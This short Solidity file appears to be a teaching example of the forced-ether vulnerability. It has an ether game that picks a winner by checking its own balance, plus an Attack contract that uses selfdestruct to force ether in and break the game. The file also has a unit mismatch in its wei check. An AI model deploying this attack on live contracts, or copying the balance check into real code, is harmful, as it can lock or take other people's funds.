// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

contract EthGame{
    uint256 public constant TARGET = 10 ether;
    address payable  winner;

    function play()external  payable {
        require(msg.value > 1,"require more than 1 ether");
        uint256 balance = address(this).balance;
        if(balance == TARGET){
            winner = payable (msg.sender);
        }
    }
    function claimReward()public{
        require(winner == msg.sender,"not winner");
        (bool success,)= winner.call{value:address(this).balance}("");
        require(success,"failed to transfer");
    }

}

contract Attack{
    EthGame public ethgame;
    constructor(address _ethgame)payable{
        ethgame = EthGame(_ethgame);
    }

    function attackit()external payable {
        selfdestruct(payable(address(ethgame)));
    }
}